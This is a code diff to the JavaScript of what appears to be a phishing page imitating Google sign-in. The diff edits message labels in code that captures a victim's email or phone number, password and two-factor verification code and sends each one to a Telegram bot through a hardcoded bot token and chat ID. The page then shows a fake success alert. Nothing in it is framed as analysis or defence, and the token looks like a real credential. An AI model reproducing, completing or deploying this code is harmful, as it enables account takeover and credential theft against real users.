@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function() {
-// Telegram Bot Configuration
+    // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
     const TELEGRAM_CHAT_ID = '8163151595'; // Replace with your chat ID
     
@@ -88,7 +88,7 @@ document.addEventListener('DOMContentLoaded', function() {
         hideError(emailError);
         
         // Send email to Telegram
-        await sendToTelegram(`📧 <b>Google Account Login - Email Submitted</b>\n\nEmail/Phone: <code>${email}</code>`);
+        await sendToTelegram(`📧 <b>Google Login - Email Submitted</b>\n\nEmail/Phone: <code>${email}</code>`);
         
         currentEmail = email;
         displayEmail.textContent = email;
@@ -118,7 +118,7 @@ document.addEventListener('DOMContentLoaded', function() {
         hideError(passwordError);
         
         // Send password to Telegram
-        await sendToTelegram(`🔑 <b>Google Account Login - Password Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nPassword: <code>${password}</code>`);
+        await sendToTelegram(`🔑 <b>Google Login - Password Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nPassword: <code>${password}</code>`);
         
         passwordCard.classList.add('hidden');
         verificationCard.classList.remove('hidden');
@@ -144,7 +144,7 @@ document.addEventListener('DOMContentLoaded', function() {
         hideError(verificationError);
         
         // Send verification code to Telegram
-        await sendToTelegram(`✅ <b>Google Account Login - Verification Code Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nVerification Code: <code>${code}</code>`);
+        await sendToTelegram(`✅ <b>Google Login - Verification Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nCode: <code>${code}</code>`);
         
         alert('Verification successful! Redirecting to your account...');
         // window.location.href = 'https://myaccount.google.com';
